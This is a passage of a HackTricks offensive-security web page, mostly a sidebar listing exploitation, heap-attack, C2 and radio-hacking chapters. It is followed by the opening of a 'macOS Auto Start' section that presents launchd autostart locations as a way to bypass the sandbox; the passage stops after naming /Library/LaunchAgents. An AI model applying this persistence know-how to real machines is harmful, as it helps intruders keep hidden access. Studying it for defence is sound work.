aria-hidden="true">207.</strong> Pentesting Cloud (AWS, GCP, Az...)</a></li><li class="chapter-item expanded "><a href="../https://cloud.hacktricks.xyz/pentesting-ci-cd/pentesting-ci-cd-methodology.html"><strong aria-hidden="true">208.</strong> Pentesting CI/CD (Github, Jenkins, Terraform...)</a></li><li class="chapter-item expanded affix "><li class="part-title">😎 Hardware/Physical Access</li><li class="chapter-item expanded "><a href="../hardware-physical-access/physical-attacks.html"><strong aria-hidden="true">209.</strong> Physical Attacks</a></li><li class="chapter-item expanded "><a href="../hardware-physical-access/escaping-from-gui-applications.html"><strong aria-hidden="true">210.</strong> Escaping from KIOSKs</a></li><li class="chapter-item expanded "><a href="../hardware-physical-access/firmware-analysis/index.html"><strong aria-hidden="true">211.</strong> Firmware Analysis</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../hardware-physical-access/firmware-analysis/bootloader-testing.html"><strong aria-hidden="true">211.1.</strong> Bootloader testing</a></li><li class="chapter-item expanded "><a href="../hardware-physical-access/firmware-analysis/firmware-integrity.html"><strong aria-hidden="true">211.2.</strong> Firmware Integrity</a></li></ol></li><li class="chapter-item expanded "><li class="part-title">🎯 Binary Exploitation</li><li class="chapter-item expanded "><a href="../binary-exploitation/basic-stack-binary-exploitation-methodology/index.html"><strong aria-hidden="true">212.</strong> Basic Stack Binary Exploitation Methodology</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../binary-exploitation/basic-stack-binary-exploitation-methodology/elf-tricks.html"><strong aria-hidden="true">212.1.</strong> ELF Basic Information</a></li><li class="chapter-item expanded "><a href="../binary-exploitation/basic-stack-binary-exploitation-methodology/tools/index.html"><strong aria-hidden="true">212.2.</strong> Exploiting Tools</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../binary-exploitation/basic-stack-binary-exploitation-methodology/tools/pwntools.html"><strong aria-hidden="true">212.2.1.</strong> PwnTools</a></li></ol></li></ol></li><li class="chapter-item expanded "><a href="../binary-exploitation/stack-overflow/index.html"><strong aria-hidden="true">213.</strong> Stack Overflow</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../binary-exploitation/stack-overflow/pointer-redirecting.html"><strong aria-hidden="true">213.1.</strong> Pointer Redirecting</a></li><li class="chapter-item expanded "><a href="../binary-exploitation/stack-overflow/ret2win/index.html"><strong aria-hidden="true">213.2.</strong> Ret2win</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../binary-exploitation/stack-overflow/ret2win/ret2win-arm64.html"><strong aria-hidden="true">213.2.1.</strong> Ret2win - arm64</a></li></ol></li><li class="chapter-item expanded "><a href="../binary-exploitation/stack-overflow/stack-shellcode/index.html"><strong aria-hidden="true">213.3.</strong> Stack Shellcode</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../binary-exploitation/stack-overflow/stack-shellcode/stack-shellcode-arm64.html"><strong aria-hidden="true">213.3.1.</strong> Stack Shellcode - arm64</a></li></ol></li><li class="chapter-item expanded "><a href="../binary-exploitation/stack-overflow/stack-pivoting-ebp2ret-ebp-chaining.html"><strong aria-hidden="true">213.4.</strong> Stack Pivoting - EBP2Ret - EBP chaining</a></li><li class="chapter-item expanded "><a href="../binary-exploitation/stack-overflow/uninitialized-variables.html"><strong aria-hidden="true">213.5.</strong> Uninitialized Variables</a></li></ol></li><li class="chapter-item expanded "><a href="../binary-exploitation/rop-return-oriented-programing/index.html"><strong aria-hidden="true">214.</strong> ROP - Return Oriented Programing</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../binary-exploitation/rop-return-oriented-programing/brop-blind-return-oriented-programming.html"><strong aria-hidden="true">214.1.</strong> BROP - Blind Return Oriented Programming</a></li><li class="chapter-item expanded "><a href="../binary-exploitation/rop-return-oriented-programing/ret2csu.html"><strong aria-hidden="true">214.2.</strong> Ret2csu</a></li><li class="chapter-item expanded "><a href="../binary-exploitation/rop-return-oriented-programing/ret2dlresolve.html"><strong aria-hidden="true">214.3.</strong> Ret2dlresolve</a></li><li class="chapter-item expanded "><a href="../binary-exploitation/rop-return-oriented-programing/ret2esp-ret2reg.html"><strong aria-hidden="true">214.4.</strong> Ret2esp / Ret2reg</a></li><li class="chapter-item expanded "><a href="../binary-exploitation/rop-return-oriented-programing/ret2lib/index.html"><strong aria-hidden="true">214.5.</strong> Ret2lib</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../binary-exploitation/rop-return-oriented-programing/ret2lib/rop-leaking-libc-address/index.html"><strong aria-hidden="true">214.5.1.</strong> Leaking libc address with ROP</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../binary-exploitation/rop-return-oriented-programing/ret2lib/rop-leaking-libc-address/rop-leaking-libc-template.html"><strong aria-hidden="true">214.5.1.1.</strong> Leaking libc - template</a></li></ol></li><li class="chapter-item expanded "><a href="../binary-exploitation/rop-return-oriented-programing/ret2lib/one-gadget.html"><strong aria-hidden="true">214.5.2.</strong> One Gadget</a></li><li class="chapter-item expanded "><a href="../binary-exploitation/rop-return-oriented-programing/ret2lib/ret2lib-+-printf-leak-arm64.html"><strong aria-hidden="true">214.5.3.</strong> Ret2lib + Printf leak - arm64</a></li></ol></li><li class="chapter-item expanded "><a href="../binary-exploitation/rop-return-oriented-programing/rop-syscall-execv/index.html"><strong aria-hidden="true">214.6.</strong> Ret2syscall</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../binary-exploitation/rop-return-oriented-programing/rop-syscall-execv/ret2syscall-arm64.html"><strong aria-hidden="true">214.6.1.</strong> Ret2syscall - ARM64</a></li></ol></li><li class="chapter-item expanded "><a href="../binary-exploitation/rop-return-oriented-programing/ret2vdso.html"><strong aria-hidden="true">214.7.</strong> Ret2vDSO</a></li><li class="chapter-item expanded "><a href="../binary-exploitation/rop-return-oriented-programing/srop-sigreturn-oriented-programming/index.html"><strong aria-hidden="true">214.8.</strong> SROP - Sigreturn-Oriented Programming</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../binary-exploitation/rop-return-oriented-programing/srop-sigreturn-oriented-programming/srop-arm64.html"><strong aria-hidden="true">214.8.1.</strong> SROP - ARM64</a></li></ol></li></ol></li><li class="chapter-item expanded "><a href="../binary-exploitation/array-indexing.html"><strong aria-hidden="true">215.</strong> Array Indexing</a></li><li class="chapter-item expanded "><a href="../binary-exploitation/integer-overflow.html"><strong aria-hidden="true">216.</strong> Integer Overflow</a></li><li class="chapter-item expanded "><a href="../binary-exploitation/format-strings/index.html"><strong aria-hidden="true">217.</strong> Format Strings</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../binary-exploitation/format-strings/format-strings-arbitrary-read-example.html"><strong aria-hidden="true">217.1.</strong> Format Strings - Arbitrary Read Example</a></li><li class="chapter-item expanded "><a href="../binary-exploitation/format-strings/format-strings-template.html"><strong aria-hidden="true">217.2.</strong> Format Strings Template</a></li></ol></li><li class="chapter-item expanded "><a href="../binary-exploitation/libc-heap/index.html"><strong aria-hidden="true">218.</strong> Libc Heap</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../binary-exploitation/libc-heap/bins-and-memory-allocations.html"><strong aria-hidden="true">218.1.</strong> Bins & Memory Allocations</a></li><li class="chapter-item expanded "><a href="../binary-exploitation/libc-heap/heap-memory-functions/index.html"><strong aria-hidden="true">218.2.</strong> Heap Memory Functions</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../binary-exploitation/libc-heap/heap-memory-functions/free.html"><strong aria-hidden="true">218.2.1.</strong> free</a></li><li class="chapter-item expanded "><a href="../binary-exploitation/libc-heap/heap-memory-functions/malloc-and-sysmalloc.html"><strong aria-hidden="true">218.2.2.</strong> malloc & sysmalloc</a></li><li class="chapter-item expanded "><a href="../binary-exploitation/libc-heap/heap-memory-functions/unlink.html"><strong aria-hidden="true">218.2.3.</strong> unlink</a></li><li class="chapter-item expanded "><a href="../binary-exploitation/libc-heap/heap-memory-functions/heap-functions-security-checks.html"><strong aria-hidden="true">218.2.4.</strong> Heap Functions Security Checks</a></li></ol></li><li class="chapter-item expanded "><a href="../binary-exploitation/libc-heap/use-after-free/index.html"><strong aria-hidden="true">218.3.</strong> Use After Free</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../binary-exploitation/libc-heap/use-after-free/first-fit.html"><strong aria-hidden="true">218.3.1.</strong> First Fit</a></li></ol></li><li class="chapter-item expanded "><a href="../binary-exploitation/libc-heap/double-free.html"><strong aria-hidden="true">218.4.</strong> Double Free</a></li><li class="chapter-item expanded "><a href="../binary-exploitation/libc-heap/overwriting-a-freed-chunk.html"><strong aria-hidden="true">218.5.</strong> Overwriting a freed chunk</a></li><li class="chapter-item expanded "><a href="../binary-exploitation/libc-heap/heap-overflow.html"><strong aria-hidden="true">218.6.</strong> Heap Overflow</a></li><li class="chapter-item expanded "><a href="../binary-exploitation/libc-heap/unlink-attack.html"><strong aria-hidden="true">218.7.</strong> Unlink Attack</a></li><li class="chapter-item expanded "><a href="../binary-exploitation/libc-heap/fast-bin-attack.html"><strong aria-hidden="true">218.8.</strong> Fast Bin Attack</a></li><li class="chapter-item expanded "><a href="../binary-exploitation/libc-heap/unsorted-bin-attack.html"><strong aria-hidden="true">218.9.</strong> Unsorted Bin Attack</a></li><li class="chapter-item expanded "><a href="../binary-exploitation/libc-heap/large-bin-attack.html"><strong aria-hidden="true">218.10.</strong> Large Bin Attack</a></li><li class="chapter-item expanded "><a href="../binary-exploitation/libc-heap/tcache-bin-attack.html"><strong aria-hidden="true">218.11.</strong> Tcache Bin Attack</a></li><li class="chapter-item expanded "><a href="../binary-exploitation/libc-heap/off-by-one-overflow.html"><strong aria-hidden="true">218.12.</strong> Off by one overflow</a></li><li class="chapter-item expanded "><a href="../binary-exploitation/libc-heap/house-of-spirit.html"><strong aria-hidden="true">218.13.</strong> House of Spirit</a></li><li class="chapter-item expanded "><a href="../binary-exploitation/libc-heap/house-of-lore.html"><strong aria-hidden="true">218.14.</strong> House of Lore | Small bin Attack</a></li><li class="chapter-item expanded "><a href="../binary-exploitation/libc-heap/house-of-einherjar.html"><strong aria-hidden="true">218.15.</strong> House of Einherjar</a></li><li class="chapter-item expanded "><a href="../binary-exploitation/libc-heap/house-of-force.html"><strong aria-hidden="true">218.16.</strong> House of Force</a></li><li class="chapter-item expanded "><a href="../binary-exploitation/libc-heap/house-of-orange.html"><strong aria-hidden="true">218.17.</strong> House of Orange</a></li><li class="chapter-item expanded "><a href="../binary-exploitation/libc-heap/house-of-rabbit.html"><strong aria-hidden="true">218.18.</strong> House of Rabbit</a></li><li class="chapter-item expanded "><a href="../binary-exploitation/libc-heap/house-of-roman.html"><strong aria-hidden="true">218.19.</strong> House of Roman</a></li></ol></li><li class="chapter-item expanded "><a href="../binary-exploitation/common-binary-protections-and-bypasses/index.html"><strong aria-hidden="true">219.</strong> Common Binary Exploitation Protections & Bypasses</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../binary-exploitation/common-binary-protections-and-bypasses/aslr/index.html"><strong aria-hidden="true">219.1.</strong> ASLR</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../binary-exploitation/common-binary-protections-and-bypasses/aslr/ret2plt.html"><strong aria-hidden="true">219.1.1.</strong> Ret2plt</a></li><li class="chapter-item expanded "><a href="../binary-exploitation/common-binary-protections-and-bypasses/aslr/ret2ret.html"><strong aria-hidden="true">219.1.2.</strong> Ret2ret & Reo2pop</a></li></ol></li><li class="chapter-item expanded "><a href="../binary-exploitation/common-binary-protections-and-bypasses/cet-and-shadow-stack.html"><strong aria-hidden="true">219.2.</strong> CET & Shadow Stack</a></li><li class="chapter-item expanded "><a href="../binary-exploitation/common-binary-protections-and-bypasses/libc-protections.html"><strong aria-hidden="true">219.3.</strong> Libc Protections</a></li><li class="chapter-item expanded "><a href="../binary-exploitation/common-binary-protections-and-bypasses/memory-tagging-extension-mte.html"><strong aria-hidden="true">219.4.</strong> Memory Tagging Extension (MTE)</a></li><li class="chapter-item expanded "><a href="../binary-exploitation/common-binary-protections-and-bypasses/no-exec-nx.html"><strong aria-hidden="true">219.5.</strong> No-exec / NX</a></li><li class="chapter-item expanded "><a href="../binary-exploitation/common-binary-protections-and-bypasses/pie/index.html"><strong aria-hidden="true">219.6.</strong> PIE</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../binary-exploitation/common-binary-protections-and-bypasses/pie/bypassing-canary-and-pie.html"><strong aria-hidden="true">219.6.1.</strong> BF Addresses in the Stack</a></li></ol></li><li class="chapter-item expanded "><a href="../binary-exploitation/common-binary-protections-and-bypasses/relro.html"><strong aria-hidden="true">219.7.</strong> Relro</a></li><li class="chapter-item expanded "><a href="../binary-exploitation/common-binary-protections-and-bypasses/stack-canaries/index.html"><strong aria-hidden="true">219.8.</strong> Stack Canaries</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../binary-exploitation/common-binary-protections-and-bypasses/stack-canaries/bf-forked-stack-canaries.html"><strong aria-hidden="true">219.8.1.</strong> BF Forked & Threaded Stack Canaries</a></li><li class="chapter-item expanded "><a href="../binary-exploitation/common-binary-protections-and-bypasses/stack-canaries/print-stack-canary.html"><strong aria-hidden="true">219.8.2.</strong> Print Stack Canary</a></li></ol></li></ol></li><li class="chapter-item expanded "><a href="../binary-exploitation/arbitrary-write-2-exec/index.html"><strong aria-hidden="true">220.</strong> Write What Where 2 Exec</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../binary-exploitation/arbitrary-write-2-exec/www2exec-atexit.html"><strong aria-hidden="true">220.1.</strong> WWW2Exec - atexit()</a></li><li class="chapter-item expanded "><a href="../binary-exploitation/arbitrary-write-2-exec/www2exec-.dtors-and-.fini_array.html"><strong aria-hidden="true">220.2.</strong> WWW2Exec - .dtors & .fini_array</a></li><li class="chapter-item expanded "><a href="../binary-exploitation/arbitrary-write-2-exec/aw2exec-got-plt.html"><strong aria-hidden="true">220.3.</strong> WWW2Exec - GOT/PLT</a></li><li class="chapter-item expanded "><a href="../binary-exploitation/arbitrary-write-2-exec/aw2exec-__malloc_hook.html"><strong aria-hidden="true">220.4.</strong> WWW2Exec - __malloc_hook & __free_hook</a></li></ol></li><li class="chapter-item expanded "><a href="../binary-exploitation/common-exploiting-problems.html"><strong aria-hidden="true">221.</strong> Common Exploiting Problems</a></li><li class="chapter-item expanded "><a href="../binary-exploitation/windows-exploiting-basic-guide-oscp-lvl.html"><strong aria-hidden="true">222.</strong> Windows Exploiting (Basic Guide - OSCP lvl)</a></li><li class="chapter-item expanded affix "><li class="part-title">🔩 Reversing</li><li class="chapter-item expanded "><a href="../reversing/reversing-tools-basic-methods/index.html"><strong aria-hidden="true">223.</strong> Reversing Tools & Basic Methods</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../reversing/reversing-tools-basic-methods/angr/index.html"><strong aria-hidden="true">223.1.</strong> Angr</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../reversing/reversing-tools-basic-methods/angr/angr-examples.html"><strong aria-hidden="true">223.1.1.</strong> Angr - Examples</a></li></ol></li><li class="chapter-item expanded "><a href="../reversing/reversing-tools-basic-methods/satisfiability-modulo-theories-smt-z3.html"><strong aria-hidden="true">223.2.</strong> Z3 - Satisfiability Modulo Theories (SMT)</a></li><li class="chapter-item expanded "><a href="../reversing/reversing-tools-basic-methods/cheat-engine.html"><strong aria-hidden="true">223.3.</strong> Cheat Engine</a></li><li class="chapter-item expanded "><a href="../reversing/reversing-tools-basic-methods/blobrunner.html"><strong aria-hidden="true">223.4.</strong> Blobrunner</a></li></ol></li><li class="chapter-item expanded "><a href="../reversing/common-api-used-in-malware.html"><strong aria-hidden="true">224.</strong> Common API used in Malware</a></li><li class="chapter-item expanded "><a href="../reversing/word-macros.html"><strong aria-hidden="true">225.</strong> Word Macros</a></li><li class="chapter-item expanded affix "><li class="part-title">🔮 Crypto & Stego</li><li class="chapter-item expanded "><a href="../crypto-and-stego/cryptographic-algorithms/index.html"><strong aria-hidden="true">226.</strong> Cryptographic/Compression Algorithms</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../crypto-and-stego/cryptographic-algorithms/unpacking-binaries.html"><strong aria-hidden="true">226.1.</strong> Unpacking binaries</a></li></ol></li><li class="chapter-item expanded "><a href="../crypto-and-stego/certificates.html"><strong aria-hidden="true">227.</strong> Certificates</a></li><li class="chapter-item expanded "><a href="../crypto-and-stego/cipher-block-chaining-cbc-mac-priv.html"><strong aria-hidden="true">228.</strong> Cipher Block Chaining CBC-MAC</a></li><li class="chapter-item expanded "><a href="../crypto-and-stego/crypto-ctfs-tricks.html"><strong aria-hidden="true">229.</strong> Crypto CTFs Tricks</a></li><li class="chapter-item expanded "><a href="../crypto-and-stego/electronic-code-book-ecb.html"><strong aria-hidden="true">230.</strong> Electronic Code Book (ECB)</a></li><li class="chapter-item expanded "><a href="../crypto-and-stego/hash-length-extension-attack.html"><strong aria-hidden="true">231.</strong> Hash Length Extension Attack</a></li><li class="chapter-item expanded "><a href="../crypto-and-stego/padding-oracle-priv.html"><strong aria-hidden="true">232.</strong> Padding Oracle</a></li><li class="chapter-item expanded "><a href="../crypto-and-stego/rc4-encrypt-and-decrypt.html"><strong aria-hidden="true">233.</strong> RC4 - Encrypt&Decrypt</a></li><li class="chapter-item expanded "><a href="../crypto-and-stego/stego-tricks.html"><strong aria-hidden="true">234.</strong> Stego Tricks</a></li><li class="chapter-item expanded "><a href="../crypto-and-stego/esoteric-languages.html"><strong aria-hidden="true">235.</strong> Esoteric languages</a></li><li class="chapter-item expanded "><a href="../crypto-and-stego/blockchain-and-crypto-currencies.html"><strong aria-hidden="true">236.</strong> Blockchain & Crypto Currencies</a></li><li class="chapter-item expanded affix "><li class="part-title">🦂 C2</li><li class="chapter-item expanded "><a href="../c2/salseo.html"><strong aria-hidden="true">237.</strong> Salseo</a></li><li class="chapter-item expanded "><a href="../c2/icmpsh.html"><strong aria-hidden="true">238.</strong> ICMPsh</a></li><li class="chapter-item expanded "><a href="../c2/cobalt-strike.html"><strong aria-hidden="true">239.</strong> Cobalt Strike</a></li><li class="chapter-item expanded affix "><li class="part-title">✍️ TODO</li><li class="chapter-item expanded "><a href="../todo/references.html"><strong aria-hidden="true">240.</strong> Other Big References</a></li><li class="chapter-item expanded "><a href="../todo/rust-basics.html"><strong aria-hidden="true">241.</strong> Rust Basics</a></li><li class="chapter-item expanded "><a href="../todo/more-tools.html"><strong aria-hidden="true">242.</strong> More Tools</a></li><li class="chapter-item expanded "><a href="../todo/misc.html"><strong aria-hidden="true">243.</strong> MISC</a></li><li class="chapter-item expanded "><a href="../todo/pentesting-dns.html"><strong aria-hidden="true">244.</strong> Pentesting DNS</a></li><li class="chapter-item expanded "><a href="../todo/hardware-hacking/index.html"><strong aria-hidden="true">245.</strong> Hardware Hacking</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../todo/hardware-hacking/i2c.html"><strong aria-hidden="true">245.1.</strong> I2C</a></li><li class="chapter-item expanded "><a href="../todo/hardware-hacking/uart.html"><strong aria-hidden="true">245.2.</strong> UART</a></li><li class="chapter-item expanded "><a href="../todo/hardware-hacking/radio.html"><strong aria-hidden="true">245.3.</strong> Radio</a></li><li class="chapter-item expanded "><a href="../todo/hardware-hacking/jtag.html"><strong aria-hidden="true">245.4.</strong> JTAG</a></li><li class="chapter-item expanded "><a href="../todo/hardware-hacking/spi.html"><strong aria-hidden="true">245.5.</strong> SPI</a></li></ol></li><li class="chapter-item expanded "><a href="../todo/industrial-control-systems-hacking/index.html"><strong aria-hidden="true">246.</strong> Industrial Control Systems Hacking</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../todo/industrial-control-systems-hacking/modbus.html"><strong aria-hidden="true">246.1.</strong> Modbus Protocol</a></li></ol></li><li class="chapter-item expanded "><a href="../todo/radio-hacking/index.html"><strong aria-hidden="true">247.</strong> Radio Hacking</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../todo/radio-hacking/pentesting-rfid.html"><strong aria-hidden="true">247.1.</strong> Pentesting RFID</a></li><li class="chapter-item expanded "><a href="../todo/radio-hacking/infrared.html"><strong aria-hidden="true">247.2.</strong> Infrared</a></li><li class="chapter-item expanded "><a href="../todo/radio-hacking/sub-ghz-rf.html"><strong aria-hidden="true">247.3.</strong> Sub-GHz RF</a></li><li class="chapter-item expanded "><a href="../todo/radio-hacking/ibutton.html"><strong aria-hidden="true">247.4.</strong> iButton</a></li><li class="chapter-item expanded "><a href="../todo/radio-hacking/flipper-zero/index.html"><strong aria-hidden="true">247.5.</strong> Flipper Zero</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../todo/radio-hacking/flipper-zero/fz-nfc.html"><strong aria-hidden="true">247.5.1.</strong> FZ - NFC</a></li><li class="chapter-item expanded "><a href="../todo/radio-hacking/flipper-zero/fz-sub-ghz.html"><strong aria-hidden="true">247.5.2.</strong> FZ - Sub-GHz</a></li><li class="chapter-item expanded "><a href="../todo/radio-hacking/flipper-zero/fz-infrared.html"><strong aria-hidden="true">247.5.3.</strong> FZ - Infrared</a></li><li class="chapter-item expanded "><a href="../todo/radio-hacking/flipper-zero/fz-ibutton.html"><strong aria-hidden="true">247.5.4.</strong> FZ - iButton</a></li><li class="chapter-item expanded "><a href="../todo/radio-hacking/flipper-zero/fz-125khz-rfid.html"><strong aria-hidden="true">247.5.5.</strong> FZ - 125kHz RFID</a></li></ol></li><li class="chapter-item expanded "><a href="../todo/radio-hacking/proxmark-3.html"><strong aria-hidden="true">247.6.</strong> Proxmark 3</a></li><li class="chapter-item expanded "><a href="../todo/radio-hacking/fissure-the-rf-framework.html"><strong aria-hidden="true">247.7.</strong> FISSURE - The RF Framework</a></li><li class="chapter-item expanded "><a href="../todo/radio-hacking/low-power-wide-area-network.html"><strong aria-hidden="true">247.8.</strong> Low-Power Wide Area Network</a></li><li class="chapter-item expanded "><a href="../todo/radio-hacking/pentesting-ble-bluetooth-low-energy.html"><strong aria-hidden="true">247.9.</strong> Pentesting BLE - Bluetooth Low Energy</a></li></ol></li><li class="chapter-item expanded "><a href="../todo/industrial-control-systems-hacking/index.html"><strong aria-hidden="true">248.</strong> Industrial Control Systems Hacking</a></li><li class="chapter-item expanded "><a href="../todo/test-llms.html"><strong aria-hidden="true">249.</strong> Test LLMs</a></li><li class="chapter-item expanded "><a href="../todo/llm-training-data-preparation/index.html"><strong aria-hidden="true">250.</strong> LLM Training</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../todo/llm-training-data-preparation/0.-basic-llm-concepts.html"><strong aria-hidden="true">250.1.</strong> 0. Basic LLM Concepts</a></li><li class="chapter-item expanded "><a href="../todo/llm-training-data-preparation/1.-tokenizing.html"><strong aria-hidden="true">250.2.</strong> 1. Tokenizing</a></li><li class="chapter-item expanded "><a href="../todo/llm-training-data-preparation/2.-data-sampling.html"><strong aria-hidden="true">250.3.</strong> 2. Data Sampling</a></li><li class="chapter-item expanded "><a href="../todo/llm-training-data-preparation/3.-token-embeddings.html"><strong aria-hidden="true">250.4.</strong> 3. Token Embeddings</a></li><li class="chapter-item expanded "><a href="../todo/llm-training-data-preparation/4.-attention-mechanisms.html"><strong aria-hidden="true">250.5.</strong> 4. Attention Mechanisms</a></li><li class="chapter-item expanded "><a href="../todo/llm-training-data-preparation/5.-llm-architecture.html"><strong aria-hidden="true">250.6.</strong> 5. LLM Architecture</a></li><li class="chapter-item expanded "><a href="../todo/llm-training-data-preparation/6.-pre-training-and-loading-models.html"><strong aria-hidden="true">250.7.</strong> 6. Pre-training & Loading models</a></li><li class="chapter-item expanded "><a href="../todo/llm-training-data-preparation/7.0.-lora-improvements-in-fine-tuning.html"><strong aria-hidden="true">250.8.</strong> 7.0. LoRA Improvements in fine-tuning</a></li><li class="chapter-item expanded "><a href="../todo/llm-training-data-preparation/7.1.-fine-tuning-for-classification.html"><strong aria-hidden="true">250.9.</strong> 7.1. Fine-Tuning for Classification</a></li><li class="chapter-item expanded "><a href="../todo/llm-training-data-preparation/7.2.-fine-tuning-to-follow-instructions.html"><strong aria-hidden="true">250.10.</strong> 7.2. Fine-Tuning to follow instructions</a></li></ol></li><li class="chapter-item expanded "><a href="../todo/burp-suite.html"><strong aria-hidden="true">251.</strong> Burp Suite</a></li><li class="chapter-item expanded "><a href="../todo/other-web-tricks.html"><strong aria-hidden="true">252.</strong> Other Web Tricks</a></li><li class="chapter-item expanded "><a href="../todo/interesting-http.html"><strong aria-hidden="true">253.</strong> Interesting HTTP</a></li><li class="chapter-item expanded "><a href="../todo/android-forensics.html"><strong aria-hidden="true">254.</strong> Android Forensics</a></li><li class="chapter-item expanded "><a href="../todo/tr-069.html"><strong aria-hidden="true">255.</strong> TR-069</a></li><li class="chapter-item expanded "><a href="../todo/6881-udp-pentesting-bittorrent.html"><strong aria-hidden="true">256.</strong> 6881/udp - Pentesting BitTorrent</a></li><li class="chapter-item expanded "><a href="../todo/online-platforms-with-api.html"><strong aria-hidden="true">257.</strong> Online Platforms with API</a></li><li class="chapter-item expanded "><a href="../todo/stealing-sensitive-information-disclosure-from-a-web.html"><strong aria-hidden="true">258.</strong> Stealing Sensitive Information Disclosure from a Web</a></li><li class="chapter-item expanded "><a href="../todo/post-exploitation.html"><strong aria-hidden="true">259.</strong> Post Exploitation</a></li><li class="chapter-item expanded "><a href="../todo/investment-terms.html"><strong aria-hidden="true">260.</strong> Investment Terms</a></li><li class="chapter-item expanded "><a href="../todo/cookies-policy.html"><strong aria-hidden="true">261.</strong> Cookies Policy</a></li></ol>
            </div>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <!-- Track and set sidebar scroll position -->
        <script>
            var sidebarScrollbox = document.querySelector('#sidebar .sidebar-scrollbox');
            sidebarScrollbox.addEventListener('click', function(e) {
                if (e.target.tagName === 'A') {
                    sessionStorage.setItem('sidebar-scroll', sidebarScrollbox.scrollTop);
                }
            }, { passive: true });
            var sidebarScrollTop = sessionStorage.getItem('sidebar-scroll');
            sessionStorage.removeItem('sidebar-scroll');
            if (sidebarScrollTop) {
                // preserve sidebar scroll position when navigating via links within sidebar
                sidebarScrollbox.scrollTop = sidebarScrollTop;
            } else {
                // scroll sidebar to current active section when navigating via "next/previous chapter" buttons
                var activeSection = document.querySelector('#sidebar .active');
                if (activeSection) {
                    activeSection.scrollIntoView({ block: 'center' });
                }
            }
        </script>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title">HackTrick</h1>

                    <div class="right-buttons">
                        <a href="../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="macos-auto-start"><a class="header" href="#macos-auto-start">macOS Auto Start</a></h1>
<p>This section is heavily based on the blog series <a href="https://theevilbit.github.io/beyond/"><strong>Beyond the good ol' LaunchAgents</strong></a>, the goal is to add <strong>more Autostart Locations</strong> (if possible), indicate <strong>which techniques are still working</strong> nowadays with latest version of macOS (13.4) and to specify the <strong>permissions</strong> needed.</p>
<h2 id="sandbox-bypass"><a class="header" href="#sandbox-bypass">Sandbox Bypass</a></h2>
<div class='notice notice-success'><b>SUCCESS</b><br/>
Here you can find start locations useful for **sandbox bypass** that allows you to simply execute something by **writing it into a file** and **waiting** for a very **common** **action**, a determined **amount of time** or an **action you can usually perform** from inside a sandbox without needing root permissions.
</div>
<h3 id="launchd"><a class="header" href="#launchd">Launchd</a></h3>
<ul>
<li>Useful to bypass sandbox: <a href="https://emojipedia.org/check-mark-button">✅</a></li>
<li>TCC Bypass: <a href="https://emojipedia.org/large-red-circle">🔴</a></li>
</ul>
<h4 id="locations"><a class="header" href="#locations">Locations</a></h4>
<ul>
<li><strong><code>/Library/LaunchAgents</code></strong>
<ul>
